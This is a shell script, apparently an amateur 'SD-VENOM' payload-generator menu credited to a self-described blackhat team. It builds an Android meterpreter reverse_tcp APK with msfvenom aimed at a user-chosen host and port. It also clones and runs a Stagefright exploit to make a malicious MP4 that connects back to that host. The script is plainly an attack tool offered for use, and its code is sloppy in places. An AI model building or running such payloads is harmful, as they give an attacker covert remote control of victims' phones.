#!bin/sh
w='\e[97m'
g='\033[1;92m'
r='\033[1;91m'
a='\033[1;94m'
b='\e[1;4m'
reset='\033[0m'
G='\e[110m'
G1='\e[101m'
o='\033[0m'
blue='\e[1;34m'
green='\e[1;32m'
purple='\e[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
white='\e[1;37m'
yellow='\e[1;33m'
clear
count=10
while [ $count -le 100 ];
do
echo "Starting SD-VENOM......[$count%]";
sleep 0.1
clear
(( count++ ))
done
echo -e "$cyan"
toilet -f mono12 SD-VENOM
echo -e "$red:::::::::::::::::::::::::::""$cyan Payload Genetater""$blue:::::::::::::::::::::::"
echo -e "$red::::::::::::::::""$cyan CODED BY ALI-ELhafeth - S3cr3t H4Xor SDN""$blue:::::::::::"
echo -e "$yellow Payload Menu"
echo -e "$green --------------"
echo -e "$blue[""$cyan 01""$blue]""$white Author INFO";
echo -e "$blue[""$cyan 02""$blue]""$white Exit Tool";
echo -e "$blue[""$cyan 03""$blue]""$white Generate Android Payload";
echo -e "$yellow::::::::::::::::::::""$white:::::::::::::::::::::::::::::::::"
echo -e "$cyan::::::::::Zeroday sudan black""$red Hat Team""$green::::::::::::"
echo -e "$yellow:::::::::::::::::::::::""$white::::::::::::::::::::::::::::::"
echo -e "$cyan"
read -p "@SudoVenom:~#" command
if [ $command -eq 1 ];
        then
echo -e "$red loading Author info"
sleep 2.4;
clear
echo -e "$red-----------------------------""$yellow----------------------"
echo -e "$white[+]""$yellow Name : Ali ElHafeth";
echo -e "$white[+]""$yellow FROM : Sudan ";
echo -e "$white[+]""$yellow Team : Zeroday blackhat team"
echo -e "$white[+]""$yellow Facebook :""$blue https://facebook.com/zlalmoer"
echo -e "$red------------------------------""$yellow----------------------"
exit 0
elif [ $command -eq 2 ];
         then
echo -e "$red exiting sdVenom Tool"
sleep 2.4;
exit 0
clear
clear
elif [ $command -eq 3 ];
         then
echo -e "$red--------------------""$white-----------""$cyan--------------------""$yellow--------"
echo -e "$green Android Payload Enter Your host and port and pwd And Name "
echo -e "$red------------------""$white-----------""$cyan-----------------------""$yellow--------"
fi
echo -e "$white[*]Enter Your host" 
read h
if [ ! -z $h ]
   then
echo -e "$yellow[i]""$red host ==>""$white $h"
fi
echo -e "$white[*]Enter Port ""$yellow eg(port 4444)"
read p
if [ ! -z $p ]
    then
echo -e "$yellow[i]""$red Port ==>""$white $p"
fi
echo -e "$cyan[PWD]""$white Now The pwd of payload /sdcard or $HOME"
read d
if [ ! -z $d ]
     then
echo -e "$red[i]""$white Ok payload will be in""$white $d"
fi
echo -e "$red[N]""$white Now Enter Your Payload Name""$white eg(sdn.apk)"
read N
if [ ! -z $N ]
    then
echo -e "$red[i]""$white Your payload name is==> ""$ $N "
fi
echo -e "$blue-------------------------------------""$yellow-----------"
echo -e "$green Generating Your Payload with this options"
echo -e "$cyan[H]""$white HOST : $h"
echo -e "$cyan[P]""$white Port : $p"
echo -e "$cyan[PWD]""$white pwd : $d"
echo -e "$cyan[N]""$white Name : $N"
echo -e "$blue---------------------------------------""$yellow---------"
echo -e "$cyan Generating Payload..../"
sleep 5.3;
clear
#!bin/bash
#command sytem
#######################################################
cd
apt update
cd metasploit-framework
ls
./msfvenom -p android/meterpreter/reverse_tcp lhost=$h lport=$p R > /$d/$N
echo -e "$cyan Generate more payload ?"
echo -e "$blue[""$red 06""$blue]""$white Again"
echo -e "$blue[""$red 07""$blue]""$white Exit :)"
echo -e "$blue[""$red 08""$blue]""$white MP4 payload""$red(new)"
read -p "@SUDO-Venom:~#" command
if [ $command -eq 6 ];
         then
bash sudo.sh
elif [ $command -eq 9 ];
          then
echo -e "$yellow Exiting Thank's for using Tool Have apayload day :)"
sleep 2.4;
exit 0
clear
elif [ $command -eq 8 ]
            then
echo -e "$red--------------------------""$cyan-----------------------------"
echo -e "$white[+]""$yellow This is mp4 stagefright payload enter host and port"
echo -e "$red------------------------------""$cayb---------------------------"
echo -e "$white[*]""$yellow Enter Your Host"
read H
if [ ! -z H ]
       then
echo -e "$red[i]""$yellow Your host is===>""$white $H"
fi
echo -e "$white[*]""$yelow Enter Your Port(eg,4444)"
read P
if [ ! -z $P ]
        then
clear
echo -e "$red[i]""$yellow Your Port is ""$white ====> $P"
echo -e "$cyan-----------------------------""$purple------------------"
echo -e "$white[+]""$yellow Generating mp4 payload with this optinos"
echo -e "$white[+]""$yellow Host : $H"
echo -e "$white[+]""$yellow Port : $P"
echo -e "$purple WARING : ""$yellow Payload Name fireworm.mp4"
echo -e "$cyan------------------------------""$purple----------------"
echo -e "$red Generaing....../"
fi
sleep 2.4;
cd
git clone https://github.com/fireworm0/Exploit-Android-Stagefright
cd Exploit-Android-Stagefright
chmod +x mp4.py
pip2 install requests
python2 mp4.py
echo -e "$white------------------------""$purple-------------------------";
echo -e "$cyan use this command python2 mp4.py -c $H -p $P"
echo -e "$white-----------------–-------""$purple--------------------------";
fi
